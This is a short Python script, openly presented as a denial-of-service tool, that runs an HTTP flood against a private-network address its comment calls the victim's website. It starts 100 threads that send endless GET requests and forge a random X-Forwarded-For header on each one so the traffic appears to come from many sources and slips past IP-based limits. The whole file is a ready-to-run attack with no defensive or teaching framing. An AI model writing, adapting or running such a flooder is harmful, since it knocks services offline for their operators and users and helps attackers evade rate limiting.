!/usr/bin/env python3
import requests
import threading
import random
import time

target_url = "http://192.168.250.11"  # The victim's website
threads_count = 100

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def flood():
    while True:
        try:
            # Make each request look like it’s from a different IP
            headers = {
                "X-Forwarded-For": random_ip(),
                "User-Agent": "Mozilla/5.0"
            }
            # Send GET request
            r = requests.get(target_url, headers=headers, timeout=3)
            # Optionally print status or content length
            print(f"[+] {r.status_code} {len(r.content)} {headers['X-Forwarded-For']}")
        except requests.exceptions.RequestException:
            pass

print("[*] Starting HTTP flood with random X-Forwarded-For...")

# Launch multiple threads
for _ in range(threads_count):
    t = threading.Thread(target=flood, daemon=True)
    t.start()

while True:
    time.sleep(5)
